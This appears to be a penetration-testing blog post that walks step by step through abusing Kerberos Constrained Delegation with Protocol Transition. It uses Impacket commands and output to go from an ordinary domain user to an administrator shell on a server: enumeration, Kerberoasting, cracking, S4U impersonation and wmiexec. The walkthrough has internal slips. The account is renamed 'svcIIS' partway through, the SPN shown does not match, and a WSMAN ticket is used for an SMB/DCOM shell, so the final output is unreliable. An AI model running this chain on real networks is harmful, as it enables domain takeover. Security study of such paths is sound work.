---
date: '2026-06-07T12:00:38+06:00'
draft: false
title: 'Abusing Constrained Delegation Without Local Admin'
comments:
  enabled: true
  system: "giscus"
---

There is a persistent misconception in Active Directory penetration testing to pull off a Constrained Delegation attack, you need to compromise a host, escalate to local administrator, and dump credentials from memory.

While dumping LSASS is a standard path it is not a strict requirement. If the target is a user account configured with a weak password, a standard domain user can execute a complete delegation attack and achieve Domain Administrator impersonation entirely over the network, without ever touching a target endpoint's disk or needing elevated privileges.

Here is an analytical breakdown of how the intersection of Kerberoasting and Protocol Transition allows for zero-admin domain compromise, focusing on the underlying mechanics of the Kerberos S4U extensions.



## Phase 1: Identifying the Misconfiguration (Zero-Touch Enumeration)

The attack begins from the perspective of a standard, unprivileged domain user. The objective is to query Active Directory via LDAP for accounts configured with Constrained Delegation.

Looking at standard LDAP enumeration output via Impacket:

```bash
impacket-findDelegation 'corp.local/j.smith:Password!1' -dc-ip 192.168.100.10
```


```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

AccountName  AccountType  DelegationType                      DelegationRightsTo             SPN Exists
-----------  -----------  ----------------------------------  -----------------------------  ----------
DC01$        Computer     Unconstrained                       N/A                            Yes
svc_web      Person       Constrained w/ Protocol Transition  WSMAN/APP01.corp.local        Yes
svc_web      Person       Constrained w/ Protocol Transition  WSMAN/APP01                   Yes
svc_web      Person       Constrained w/ Protocol Transition  HTTP/APP01.corp.local         No
svc_web      Person       Constrained w/ Protocol Transition  HTTP/APP01                    No
```

**The Mechanics:**

The critical element here is `Constrained w/ Protocol Transition`. In Active Directory, this correlates to the `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D) user account control flag.

When a service account holds this flag, it is permitted to utilize the **S4U2Self** Kerberos extension. This means the `svc_web` account can request a service ticket to itself on behalf of _any_ other user in the domain, without requiring that user to supply a password. The `DelegationRightsTo` column dictates where that ticket can subsequently be forwarded.

Because `svc_web` is marked as a `Person` (a User account, not a Machine account), it is highly likely to have a Service Principal Name (SPN) attached, making it a viable target for offline attacks.

## Phase 2: The Silent Extraction (Kerberoasting)

If `svcIIS` was a Machine Account or a Group Managed Service Account (gMSA), the attack would require local administrator rights to extract the 120-character rotating password from memory. However, because it is a standard user account, the Kerberos protocol allows any authenticated user to request a Ticket Granting Service (TGS) ticket for it.

```bash
impacket-GetUserSPNs 'corp.local/j.smith:Password!1' \
-dc-ip 192.168.100.10 \
-request-user svc_web \
-outputfile svcweb_hash.txt

```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName          Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  --------  --------  --------------------------  --------------------------  -----------
HTTP/webapp.corp.local        svc_web             2025-01-10 09:15:22.000000  2026-06-06 02:39:59.678483 constrained

```

```bash
cat svcweb_hash.txt
```

```bash
$krb5tgs$23$*svc_web$CORP.LOCAL$corp.local/svc_web*$<REDACTED_TGS_HASH>
```

**The Mechanics:**

The Domain Controller returns a TGS encrypted with the RC4-HMAC hash of the `svc_web` account's password. The attacker now possesses the cryptographic material required to authenticate as `svc_web`. By taking this hash offline and cracking it (revealing `Password1@`), the attacker gains full control of the service account without ever executing code on the IIS server itself.

## Phase 3: Forging the VIP Pass (S4U2Self & S4U2Proxy)

This is where the zero-admin narrative crystallizes. With the plaintext password recovered, the attacker derives the NT Hash (`43460d636f269c709b20049cee36ae7a`) and initiates the protocol abuse.


```bash
impacket-getST corp.local/svc_web \
-hashes :43460d636f269c709b20049cee36ae7a \
-spn wsman/APP01.corp.local \
-impersonate Administrator \
-k

```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@wsman_APP01.corp.local@CORP.LOCAL.ccache
```


**The Mechanics:**

This single command executes the core of the Constrained Delegation attack entirely over the network:

1. **S4U2Self:** The attacker authenticates as `svc_web` and requests a ticket to itself on behalf of the `Administrator` account. Because `svc_web` has Protocol Transition enabled, the Domain Controller obliges and issues a forwardable ticket.
    
2. **S4U2Proxy:** The attacker immediately takes that forwardable ticket and presents it back to the Domain Controller, requesting access to the downstream service defined in the LDAP enumeration (`wsman/APP01`).
    
3. **The Result:** The DC issues a valid Kerberos Service Ticket proving the attacker is the Domain `Administrator` for that specific service.
    

At no point was the `Administrator` password guessed, nor was an elevated session required.

## Phase 4: Realistic Impact Execution

With the forged ticket exported to the local credential cache, the attacker can leverage native remote administration protocols like WMI (Windows Management Instrumentation) or WinRM to interact with the target server.


```bash
export KRB5CCNAME=Administrator@wsman_APP01.corp.local@CORP.LOCAL.ccache
```

```bash
impacket-wmiexec -k -no-pass \
corp.local/Administrator@APP01.corp.local
```

```bash
corp.local/Administrator@APP01.corp.local

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used

[!] Launching semi-interactive shell
[!] Press help for extra shell commands

C:\>whoami
corp\administrator

C:\>hostname
APP01

C:\>

```


**The Impact:**

By evaluating the data integrity of this attack path, the severity becomes clear. A low-privilege attacker leveraged a standard protocol feature to bypass security boundaries, resulting in an interactive `administrator` level shell on a sensitive server.

Relying on the assumption that attackers must first compromise endpoints to abuse delegation creates a dangerous blind spot. As long as Protocol Transition is paired with crackable passwords, the network is vulnerable to remote, unprivileged domain compromise.